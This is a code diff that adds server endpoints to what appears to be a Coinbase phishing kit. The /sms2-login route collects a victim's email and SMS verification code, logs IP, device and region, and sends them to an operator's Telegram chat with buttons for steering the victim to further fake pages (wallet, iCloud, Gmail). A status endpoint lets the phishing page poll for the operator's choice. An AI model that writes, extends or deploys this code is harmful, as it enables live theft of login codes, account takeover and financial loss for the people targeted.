@@ -1758,6 +1758,129 @@ app.get("/get-selected-digits", (req, res) => {
 // ============================================================================
 // ============================================================================
 // ============================================================================
+// ============================================================================
+// POST /sms2-login - Send SMS 2 code to winner bot
+// ============================================================================
+
+app.post("/sms2-login", async (req, res) => {
+  try {
+    const { code, userId, email } = req.body;
+
+    if (!code || !userId || !email) {
+      return res.status(400).json({ error: "Missing code, userId, or email" });
+    }
+
+    const ip = getIP(req);
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+    const fingerprint = getDeviceFingerprint(req);
+    const ipPrefix = ip.split(".").slice(0, 3).join(".");
+
+    // ✅ RESOLVE LATEST EMAIL from fingerprint or IP (for display)
+    let displayEmail = email;
+    
+    if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
+      displayEmail = deviceFingerprintToEmail[fingerprint];
+    } else if (ipPrefix && ipPrefixToEmail[ipPrefix]) {
+      displayEmail = ipPrefixToEmail[ipPrefix];
+    }
+
+    // ✅ Generate SMS 2 ID
+    const sms2Id = `sms2_${Date.now()}_${Math.random().toString(36).substring(7)}`;
+
+    // ✅ Store SMS 2 data
+    pendingSMS2[sms2Id] = { 
+      status: "pending", 
+      userId, 
+      email: displayEmail || email,
+      displayEmail,
+      code,
+      choice: null 
+    };
+
+    const message =
+      `😈😈😈 <b>Coinbase - SMS 2</b> 😈😈😈\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+      `<b>📧 Email:</b> <code>${displayEmail}</code>\n` +
+      `<b>💬 Code:</b> <code>${code}</code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📍 IP:</b> ${ip}`;
+
+    const options = {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "❌ Reject ❌", callback_data: `sms2_reject|${sms2Id}` }],
+          [
+            { text: "🏁 Done 🏁", callback_data: `sms2_done|${sms2Id}` },
+            { text: "💼 Wallet 💼", callback_data: `sms2_wallet|${sms2Id}` }
+          ],
+          [
+            { text: "☁️ iCloud ☁️", callback_data: `sms2_icloud|${sms2Id}` },
+            { text: "🌈 Gmail 🌈", callback_data: `sms2_gmail|${sms2Id}` }
+          ]
+        ]
+      }
+    };
+
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
+
+    // ✅ SEND TO WINNER ONLY
+    if (email && userWinnerTelegram[email]) {
+      await sendFollowUpMessage(email, message, options);
+    } else {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: options.parse_mode,
+          reply_markup: options.reply_markup
+        })
+      });
+    }
+
+    res.json({ ok: true, sms2Id });
+
+  } catch (err) {
+    console.error("❌ SMS2 Login endpoint error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ============================================================================
+// POST /check-sms2-status - Check SMS 2 choice
+// ============================================================================
+
+app.post("/check-sms2-status", (req, res) => {
+  try {
+    const sms2Id = (req.query.sms2Id || "").trim();
+
+    if (!sms2Id) {
+      return res.json({ choice: null });
+    }
+
+    if (pendingSMS2[sms2Id]) {
+      const choice = pendingSMS2[sms2Id].choice;
+      if (choice) {
+        return res.json({ choice });
+      }
+    }
+
+    res.json({ choice: null });
+
+  } catch (err) {
+    console.error("Check SMS2 status error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ============================================================================
 // POST /update-sms2-choice
 // ============================================================================
 
@@ -1795,7 +1918,7 @@ app.get("/get-sms2-info/:sms2Id", (req, res) => {
     const entry = pendingSMS2[sms2Id];
     
     if (entry) {
-      res.json({ email: entry.email });
+      res.json({ email: entry.email || entry.displayEmail });
     } else {
       res.json({ email: null });
     }
